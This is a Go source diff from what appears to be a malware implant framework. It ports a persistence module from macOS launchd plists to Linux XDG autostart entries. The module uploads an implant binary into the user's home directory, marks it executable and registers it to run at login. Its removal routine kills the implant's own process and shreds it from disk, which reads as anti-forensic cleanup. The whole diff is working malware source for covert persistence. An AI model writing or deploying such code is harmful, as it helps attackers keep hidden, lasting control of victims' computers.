@@ -1,4 +1,4 @@
-// +build launchd
+// +build linuxautostart
 
 
 package persistence
@@ -9,19 +9,17 @@ import (
 	"os"
 	"os/user"
 	"fmt"
-	//"strconv"
+	"strconv"
 )
 
-
-type BiPersistenceLaunchd struct {
+type BiPersistenceAutoStart struct {
 	Path string   `json:"implantpath"`
-	LaunchdName string   `json:"launchdname"`
+	AutostartName string   `json:"autostartname"`
 }
-
 
 func AddPersistence(jsonPersistence string,blob string) (bool,string){
 
-	var moduleParams *BiPersistenceLaunchd
+	var moduleParams *BiPersistenceAutoStart
 
 	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
 	if errDaws != nil{
@@ -37,64 +35,78 @@ func AddPersistence(jsonPersistence string,blob string) (bool,string){
 	implantPath := usr.HomeDir +"/"+ moduleParams.Path
 
     //Fix where the AutoStart file need to be palced 
-    var plistPath string
-	
-	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"
+    var autostartPath string
 
+    value := os.Getenv("XDG_CONFIG_HOME")
+    if len(value) == 0 {
+		
+		err1,errString1 := CreateDirIfNotExist(usr.HomeDir + "/.config")
+		if err1 {
+			return true,"Error Creating .config:" + errString1.Error()
+		}
+
+		err2,errString2 := CreateDirIfNotExist(usr.HomeDir + "/.config/autostart/")
+		
+		if err2 {
+			return true,"Error Creating .config:" + errString2.Error()
+		}
+		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
+
+	}else{
+
+		err1,errString1 := CreateDirIfNotExist(value + "/.config")
+		if err1 {
+			return true,"Error Creating .config:" + errString1.Error()
+		}
+
+		err2,errString2 := CreateDirIfNotExist(value  + "/.config/autostart/")
+		
+		if err2 {
+			return true,"Error Creating .config:" + errString2.Error()
+		}
+
+    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
+
+    }
     //Create Autostart string and write on path
-	plist_string :=
+	autostart_string :=
 		fmt.Sprintf(
 		`
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key>
-  <string>com.%s.user.agent</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>%s</string>    
-  </array>
-  <key>RunAtLoad</key>
-  <true/>
-  <key>KeepAlive</key>
-    <true/>  
-  <key>StandardErrorPath</key>
-  <string>/dev/null</string>
-  <key>StandardOutPath</key>
-  <string>/dev/null</string>
-</dict>
-</plist>
-		`,moduleParams.LaunchdName,implantPath)
+		[Desktop Entry] 
 
-	plistFile, err := os.Create(plistPath)
+		Type=Application
+
+		Exec=%s
+		`,implantPath)
+
+	autostartFile, err := os.Create(autostartPath)
 	if err != nil {
-		return true,"Error Creating Plist file:" + err.Error()
+		return true,"Error Creating Autostart file:" + err.Error()
 	}
 
-	if _, err = plistFile.WriteString(plist_string); err != nil {
-		return true,"Error Writing Plist file::" + err.Error()
+	if _, err = autostartFile.WriteString(autostart_string); err != nil {
+		return true,"Error Writing Autostart file::" + err.Error()
 	}	
 
-	defer plistFile.Close()
-    //Get Blob and write on implantPath
-
+	defer autostartFile.Close()
 
 	errUpload,stringErr := biterpreter.Upload(implantPath,blob)
 	if errUpload{
 		return true,"Error Uploading Implant on Persistence:" + stringErr
 	}
 
+
 	if err = os.Chmod(implantPath, 0755); err != nil {
 		return true,"Error Writing Implant file:" + err.Error()
 	}
+
 
     return false,"Persisted"
 }
 
 func CheckPersistence(jsonPersistence string) (bool,string){
 
-	var moduleParams *BiPersistenceLaunchd
+	var moduleParams *BiPersistenceAutoStart
 
 	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
 	if errDaws != nil{
@@ -116,18 +128,29 @@ func CheckPersistence(jsonPersistence string) (bool,string){
 	}
 
     //Fix where the AutoStart file need to be palced 
-    var plistPath string
-    var plistExists bool
-	
-	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"
-	
-	plistExists,errI = exists(plistPath)
-	if errI != nil {
-		return true,"Error Checking Plist File Existence:" + errI.Error()
-	}
+    var autostartPath string
+    var autostartExists bool
+
+    value := os.Getenv("XDG_CONFIG_HOME")
+    if len(value) == 0 {
+		var errA error
+		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
+		autostartExists,errA = exists(autostartPath)
+		if errA != nil {
+			return true,"Error Checking Autostart existence:" + errA.Error()
+		}
+
+    }else{
+    	var errA error
+    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
+    	autostartExists,errA = exists(autostartPath)
+		if errA != nil {
+			return true,"Error Checking Autostart existence:" + errA.Error()
+		}
+    }
 
     var res string
-    if (implantExists || plistExists){
+    if (implantExists || autostartExists){
     	res = "Persisted"
     }else{
     	res = "Non Persisted"
@@ -139,7 +162,7 @@ func CheckPersistence(jsonPersistence string) (bool,string){
 
 func RemovePersistence(jsonPersistence string) (bool,string){
 
-	var moduleParams *BiPersistenceLaunchd
+	var moduleParams *BiPersistenceAutoStart
 
 	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
 	if errDaws != nil{
@@ -156,31 +179,42 @@ func RemovePersistence(jsonPersistence string) (bool,string){
 	implantPath := usr.HomeDir +"/"+ moduleParams.Path
 
     //Fix where the AutoStart file need to be palced 
-    var plistPath string
+    var autostartPath string
 
-	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"
+    value := os.Getenv("XDG_CONFIG_HOME")
+    if len(value) == 0 {
+		
+		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
 
+    }else{
+    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
+    }
 
-    //var genError string
+    var genError string
     //Remove Autostart
-    errW,errString := biterpreter.Wipe(plistPath)
+    errW,errString := biterpreter.Wipe(autostartPath)
     if errW != false {
-		return true,"Error Removing implant:" + errString
+		genError = "Error Removing AutoStart:" + errString
     }
 
     //Set a Job on the os to kill Implant and remove it from disk
     //Get actual PID, and then exec --> kill -9 PID;sleep 5;shred implantPath;rm implantPath
-
-    errW2,errString2 := biterpreter.Wipe(implantPath)
-    if errW2 != false {
-		return true,"Error Removing implant:" + errString2
-    }
 	
-	os.Exit(1)
+	s := strconv.Itoa(os.Getpid())
+	execErr,stringerr := biterpreter.Exec("kill -9 "+s+";sleep 5;shred "+implantPath+";rm "+implantPath)
+	if execErr != false {
+		genError = genError + "Implant Removed Already:" + stringerr
+	}
 
+
+    if (errW != false) || (execErr != false){
+
+    	return true,"Schtasks Error:" + genError
+    }
 
 
     return false,"Persistence Removed"
+
 }
 
 
